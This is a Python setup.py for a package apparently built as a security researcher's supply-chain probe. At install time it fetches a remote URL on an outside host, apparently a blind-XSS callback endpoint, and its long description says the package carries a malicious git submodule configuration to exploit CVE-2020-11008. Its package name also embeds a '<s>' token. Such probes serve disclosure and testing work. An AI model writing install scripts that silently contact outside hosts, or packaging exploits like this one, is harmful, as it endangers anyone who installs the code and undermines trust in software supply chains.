from setuptools import setup

import requests

setup(
    name='sp<s>dd',
    version='2.0.1',
    description=requests.get("https://bxss.r0l.me/snykdesc"),
    long_description='This package contains a mali submodule configuration designed to exploit CVE-2020-11008.',
    long_description_content_type='text/markdown',
    author='Rotem Reiss',
    author_email='rreiss@wearehackerone.com',
    install_requires=[
        'requests'
    ],
)
